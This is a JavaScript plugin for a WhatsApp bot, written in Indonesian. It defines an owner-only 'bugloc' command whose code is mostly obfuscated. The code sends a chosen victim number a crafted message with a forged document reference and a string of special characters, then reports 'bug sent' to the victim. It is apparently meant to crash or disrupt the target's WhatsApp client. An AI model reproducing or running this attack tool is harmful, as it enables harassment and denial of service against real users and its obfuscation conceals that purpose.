
let levelling = require('../lib/levelling')
let fs = require('fs')
let path = require('path')
let fetch = require('node-fetch')
let moment = require('moment-timezone')

let handler = async (m, { conn, text, command, usedPrefix }) => {
let Jimp = require('jimp')
let { exp, limit, age, money, level, role, registered } = global.db.data.users[m.sender]
    let { min, xp, max } = levelling.xpRange(level, global.multiplier)
    let umur = `*${age == '-1' ? 'Belum Daftar*' : age + '* Thn'}`
	let name = registered ? global.db.data.users[m.sender].name : conn.getName(m.sender)

const reSize = (buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}

//TIME
let d = new Date(new Date + 3600000)
    let locale = 'id'
    // d.getTimeZoneOffset()
    // Offset -420 is 18.00
    // Offset    0 is  0.00
    // Offset  420 is  7.00
    let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(d / 84600000) % 5]
    let week = d.toLocaleDateString(locale, { weekday: 'long' })
    let date = d.toLocaleDateString(locale, {
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    })

const _0x1d4eb8=_0x546f;(function(_0x4f6bbb,_0x3f74c9){const _0x4d67b3=_0x546f,_0x17b9fa=_0x4f6bbb();while(!![]){try{const _0x3ed629=parseInt(_0x4d67b3(0xb1))/(-0x144e+-0x1*-0x1fb5+-0xb66)*(parseInt(_0x4d67b3(0xc1))/(-0x42c*0x9+0x5*0x376+0x1440))+-parseInt(_0x4d67b3(0xc6))/(-0x254b+0x1b9c+0x2*0x4d9)+parseInt(_0x4d67b3(0x8b))/(0x3*0x543+-0x1e*0x32+0x3b*-0x2b)+-parseInt(_0x4d67b3(0xad))/(0x1*-0x1fff+-0x5bc*-0x1+0x1a48)+-parseInt(_0x4d67b3(0xc2))/(0x1414+0x1e02+-0x3210)*(-parseInt(_0x4d67b3(0xb8))/(-0x24a8+0x26f0+0x1*-0x241))+-parseInt(_0x4d67b3(0xbd))/(-0x13c8+0x155d*0x1+-0x18d)+parseInt(_0x4d67b3(0x9c))/(0x773*0x5+0x2c7*-0xc+0x1f1*-0x2);if(_0x3ed629===_0x3f74c9)break;else _0x17b9fa['push'](_0x17b9fa['shift']());}catch(_0x3dc79f){_0x17b9fa['push'](_0x17b9fa['shift']());}}}(_0x2068,0x21849+0x10301*-0x6+0x52e7*0x31));function _0x546f(_0x132eb9,_0x52a358){const _0xb30594=_0x2068();return _0x546f=function(_0x4c9c60,_0x165648){_0x4c9c60=_0x4c9c60-(0xe34+0x1*0x2691+-0x343d);let _0x13e31c=_0xb30594[_0x4c9c60];return _0x13e31c;},_0x546f(_0x132eb9,_0x52a358);}const doc={'key':{'fromMe':![],'participant':_0x1d4eb8(0x9a)+_0x1d4eb8(0x9f),...m[_0x1d4eb8(0x99)]?{'remoteJid':''}:{}},'message':{'documentMessage':{'url':_0x1d4eb8(0x93)+_0x1d4eb8(0x8d)+_0x1d4eb8(0xaa)+_0x1d4eb8(0x90)+_0x1d4eb8(0xb5)+_0x1d4eb8(0xc7)+_0x1d4eb8(0x9d)+_0x1d4eb8(0xab),'mimetype':_0x1d4eb8(0xae)+_0x1d4eb8(0x95)+_0x1d4eb8(0xa0),'fileSha256':_0x1d4eb8(0xa7)+_0x1d4eb8(0xac)+_0x1d4eb8(0xbb)+_0x1d4eb8(0x98)+_0x1d4eb8(0x8c),'fileLength':_0x1d4eb8(0x96),'pageCount':0x1,'mediaKey':_0x1d4eb8(0xa5)+_0x1d4eb8(0xc4)+_0x1d4eb8(0xb4)+_0x1d4eb8(0xa6)+_0x1d4eb8(0xc0),'fileName':_0x1d4eb8(0xc3)+'s','fileEncSha256':_0x1d4eb8(0x8f)+_0x1d4eb8(0x97)+_0x1d4eb8(0x8e)+_0x1d4eb8(0xb7)+_0x1d4eb8(0xb0)}}};if(!text)return m[_0x1d4eb8(0x88)](_0x1d4eb8(0xb2)+_0x1d4eb8(0xbc)+_0x1d4eb8(0xc5)+_0x1d4eb8(0xa2)+_0x1d4eb8(0x8a));let [number,pesan]=text[_0x1d4eb8(0x94)]`|`,user=global['db'][_0x1d4eb8(0xba)][_0x1d4eb8(0xbe)][m[_0x1d4eb8(0xb6)]],korban=''+number;var nomor=m[_0x1d4eb8(0xb6)];let gambar=fs[_0x1d4eb8(0x89)+'nc'](_0x1d4eb8(0x9b)+_0x1d4eb8(0x91)),bugnya=_0x1d4eb8(0xa8)+_0x1d4eb8(0xb3)+'\x0a\x0a';function _0x2068(){const _0x78c711=['94wOTRkm','8000502PaQMjn','Deffri\x20Gan','iUZ5HKluLD','ah\x0a\x0aContoh','994992khraqU','UTKfgrl2zX','reply','readFileSy','\x2062¡Á¡Á¡Á¡Á','3700056kNEoQI','M9k=','g.whatsapp','HN4iKWCFis','ybdZlRjhY+','j85sbZCtNt','l.jpg','.menu','https://mm','split','n/octet-st','64455','aXtytT0G2H','h3rmcoHN76','chat','0@s.whatsa','./thumbnai','2410794uuldSW','RXGvVNWAbF','Ke\x20','pp.net','ream','girim\x20Bug\x20',':\x0a.bugcata','Sukses\x20Men','p.net','P32GszzU5p','7lCAd1PIz3','TSSZu8gDEA','\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20','Loc','.net/d/f/A','nsp.enc','Php8vjdtJS','5683815dbhpYE','applicatio','MENU','5yk=','9390yTINpk','Maaf\x20Forma','mampus\x20lag','5h/TZzubVJ','q1cJ6JupaB','sender','G2W69AVPLg','7rQdLzR','@s.whatsap','data','/DXIECzjrS','t\x20Anda\x20Sal','5758512qmjxTu','users','sendButton','Qb0='];_0x2068=function(){return _0x78c711;};return _0x2068();}conn[_0x1d4eb8(0xbf)+_0x1d4eb8(0xa9)](korban+(_0x1d4eb8(0xb9)+_0x1d4eb8(0xa4)),await reSize(gambar,-0x14c5+-0x16c7*0x1+0x2c54,-0x163+0x2*-0x8c3+-0x13b1*-0x1),bugnya,wm,_0x1d4eb8(0xaf),_0x1d4eb8(0x92),doc),m[_0x1d4eb8(0x88)](_0x1d4eb8(0xa3)+_0x1d4eb8(0xa1)+_0x1d4eb8(0x9e)+korban);
}
handler.command = /^(bugloc)$/i

handler.owner = true

module.exports = handler
